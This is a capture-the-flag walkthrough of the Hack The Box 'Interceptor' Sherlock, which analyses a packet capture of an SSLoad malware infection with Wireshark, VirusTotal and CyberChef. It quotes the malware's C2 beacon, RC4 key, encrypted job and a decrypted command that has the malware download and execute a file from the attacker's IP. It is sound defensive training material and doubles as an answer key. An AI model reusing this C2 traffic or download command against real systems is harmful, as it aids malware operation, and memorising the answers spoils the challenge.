# Interceptor 

Find the Sherlock [here.](https://app.hackthebox.com/sherlocks/Interceptor?tab=play_sherlock)

## Description
A recent anomaly has been detected in our network traffic, suggesting a potential breach. Our team suspects that an unauthorized entity has infiltrated our systems and accessed confidential company data. Your mission is to unravel this mystery, understand the breach, and determine the extent of the compromised data.

| Difficulty  | Category |
| ----------- | -------- |
| Easy        | SOC      |

**Skills learned:**
* Threat intelligence
* Network traffic analysis

**File attachment(s):**
```text
Interceptor.zip
├── interceptor.pcap
```

## Questions
**1. What IP address did the original suspicious traffic come from?**

Open the .pcap file in Wireshark and begin by finding the endpoints whose traffic has been captured: **Statistics > Endpoints**

Determine which IP address(es) have the most packets:
* **10.4.17.101** - 13,193 packets
* **142.250.115.95** - 9,107 packets
* **87.249.49.206** - 2,032 packets

Start examining the traffic to/from these hosts using display filters: **ip.addr == [IP address]**

Starting from the most active, looking closer at the traffic of host **10.4.17.101** looks suspicious -- there are many TCP ACKs sent back and forth between this host and several others. We continued the investigation from here assuming this was the malicious host.

**Answer: 10.4.17.101**

**2. The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?**
Find all HTTP requests in the packet capture under **Statistics > HTTP > Requests**

![HTTPrequests](../Images/Sherlock_Interceptor_HTTP_requests.PNG)

This download from 85.239.53.219 looks suspicious, so we looked at traffic from that host using the display filter **ip.addr == 85.239.53.219** 
This route ended up not leading anywhere, so we pivoted to look at the traffic from host **krd6[.]com**

Looking for the HTTP requests from this host, we find:
```
GET /share/avp.msi HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.22631
translate: f
Host: krd6.com
HTTP/1.1 200 OK
Content-Length: 1427968
Last-Modified: Tue, 16 Apr 2024 16:34:12 GMT
Content-Type: application/x-msi
Date: Wed, 17 Apr 2024 19:37:51 GMT
ETag: "258055-1713285252-1427968"
Accept-Ranges: bytes
Connection: close
Server: WsgiDAV/4.3.0 Cheroot/10.0.0 Python/3.10.12
```

GET is not the answer here - so more digging is needed.

The next finding:
```
PROPFIND /share HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.22631
Depth: 0
translate: f
Content-Length: 0
Host: krd6.com
HTTP/1.1 207 Multi-Status
Content-Type: application/xml; charset=utf-8
Date: Wed, 17 Apr 2024 19:37:49 GMT
Content-Length: 883
Connection: close
Server: WsgiDAV/4.3.0 Cheroot/10.0.0 Python/3.10.12
<?xml version="1.0" encoding="utf-8" ?>
<ns0:multistatus xmlns:ns0="DAV:"><ns0:response><ns0:href>/share/</ns0:href><ns0:propstat><ns0:prop><ns0:resourcetype><ns0:collection /></ns0:resourcetype><ns0:creationdate>2024-04-16T16:35:58Z</ns0:creationdate><ns0:quota-used-bytes>4671451136</ns0:quota-used-bytes><ns0:quota-available-bytes>20309831680</ns0:quota-available-bytes><ns0:getlastmodified>Tue, 16 Apr 2024 16:35:58 GMT</ns0:getlastmodified><ns0:displayname>share</ns0:displayname><ns0:lockdiscovery /><ns0:supportedlock><ns0:lockentry><ns0:lockscope><ns0:exclusive /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry><ns0:lockentry><ns0:lockscope><ns0:shared /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry></ns0:supportedlock></ns0:prop><ns0:status>HTTP/1.1 200 OK</ns0:status></ns0:propstat></ns0:response></ns0:multistatus>
```

The HTTP method [PROPFIND](https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142960(v=exchg.65)) retrieves resource properties such as author, creation date and resource type in XML format.

**Answer: PROPFIND**

**3. It appears that this file is malware. What is its filename?**
While investigating question 2, we found a GET request for the suspicious file. The filename is **avp.msi**

**Answer: avp.msi**

**4. What is the SSDEEP hash of the malware as reported by VirusTotal?**
We first need to extract the malicous file from the packet capture using **File > Export Objects > HTTP** then upload it to [VirusTotal](https://www.virustotal.com/gui/home/upload) for analysis.

The results from VirusTotal can be found [here](https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a).

Navigate to the VirusTotal **Details** tab and find the SSDEEP hash to answer the question.

**Answer: 24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz**

**5. According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?**

Navigate to the VirusTotal **Community** tab and find the comment from user **NeikiAnalytics** to answer the question.

Family labels can also be found under the VirusTotal **Detection** tab under **Family labels**.

**Answer: ssload**

**6. What is the creation time of the malware?**

Navigate to the VirusTotal **Details** tab and find **Creation Time** under **History**.

**Answer: 2009-12-11 11:47:44**

**7. What is the domain name that the malware is trying to connect with?**

Navigate to the VirusTotal **Relations** tab and find the domain under **Contacted Domains**.

**Answer: api.ipify.org**

**8. What is the IP address that the attacker has consistently used for communication?**

Looking closer at the information in the VirusTotal **Relations** tab, we see several **Contacted URLs** that all have the same IP address. 

Going back to the pcap file, this was the same address that had a suspicious HTTP request seen in question 2. This must be the IP used for communication.

**Answer: 85.239.53.219**

**9. Which file, included in the original package, is extracted and utilized by the malware during execution?**

Navigate to the VirusTotal **Relations** tab and look at the list of **Dropped Files** to see if any stand out.

The file at the top of the list (forcedelctl.dll) has, at time of writing, 52/72 detections so it is certainly malicious.

Confirm if this file was included in the original package:
* Export the malware (avp.msi) from the pcap file
* Use 7z to list the contents of the file: **7z l avp.msi**

forcedelctl can be found in the archive output.

**Answer: forcedelctl.dll**

**10. What program is used to execute the malware?**
Navigate to the VirusTotal **Behavior** tab and under **Processes Created** and **Shell Commands** we can see msiexec.exe is used.

**Answer: msiexec.exe**

**11. What is the hostname of the compromised machine?**

Going back to the pacap file, find and follow the TCP stream for the malicious download HTTP request from host 85.239.53.219.
```
POST /api/gateway HTTP/1.1
Connection: Keep-Alive
Content-Type: application/json
Referer: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 170
Host: 85.239.53.219
{"version":"v1.4.0","ip":"173.66.46.97","domain":"WORKGROUP","hostname":"DESKTOP-FWQ3U4C","arch":"x86","os_version":"Windows 6.3.9600","cur_user":"User","owner":"Nevada"}
```

The compromised hostname is given in the POST /api/gateway request.

**Answer: DESKTOP-FWQ3U4C**

**12. What is the key that was used in the attack?**

Continue to follow the TCP stream from question 11:
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 17 Apr 2024 19:38:10 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 74
Connection: keep-alive
Referrer-Policy: no-referrer
{"key": "WkZPxBoH6CA3Ok4iI", "id": "b98c911c-e29c-396e-2990-a7441af79546"}
```

The key is given in the 200 OK response to the POST.

**Answer: WkZPxBoH6CA3Ok4iI**

**13. What is the os_version of the compromised machine?**
Re-look at the POST request in question 11. The OS of the compromised machine is given.

**Answer: Windows 6.3.9600**

**14. What is the owner name of the compromised machine?**
Re-look at the POST request in question 11. The owner of the compromised machine is given.

**Answer: Nevada**

**15. After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?**

Continue to follow the TCP stream from question 11:
```
POST /api/b98c911c-e29c-396e-2990-a7441af79546/tasks HTTP/1.1
Connection: Keep-Alive
Content-Type: application/json
Referer: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 0
Host: 85.239.53.219
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 17 Apr 2024 19:38:10 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 185
Connection: keep-alive
Referrer-Policy: no-referrer
{"id": "576ba7b6-077c-45fb-94b4-10fd156e93c3", "job": "B//jOYkMjUR2wj+L/9U9WafJi7K/GMIoeILXOeXYfdGUMV8eNqoLdrQlZ35neKaqiGJ4Vijv4WuInBYFg1nnW9sY0sdq0imYHI1jW+skjZIgz3ICgNSxOkxRTpwzCA=="}
```

An encrypted job can be found in the server response. Now we must figure out how to decrypt it.

Web research uncovered [this source](https://www.netwitness.com/modules/firstwatch-intelligence/firstwatch-threat-spotlight-unraveling-ssload-a-multi-stage-malware-menace/) about reversing SSLoad malware, and says *"The job is an RC4-encrypted struct encoded as a Base64 string containing two fields: a “command” and an array of arguments."*

Use [CyberChef](https://gchq.github.io/CyberChef/) to decode the job using the following recipe:
* Passphrase: **WkZPxBoH6CA3Ok4iI**
* Input format: **Base64**
* Input: **B//jOYkMjUR2wj+L/9U9WafJi7K/GMIoeILXOeXYfdGUMV8eNqoLdrQlZ35neKaqiGJ4Vijv4WuInBYFg1nnW9sY0sdq0imYHI1jW+skjZIgz3ICgNSxOkxRTpwzCA==**

![CyberChef](../Images/Sherlock_Interceptor_CyberChef.PNG)

The output is 
```
{"command": "exe", "args": ["hxxp://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
```

**Answer: {"command": "exe", "args": ["hxxp://85.239.53.219/download?id=Nevada&module=2&filename=None"]}** !! The answer provided has been defanged. Change back to http before submitting.
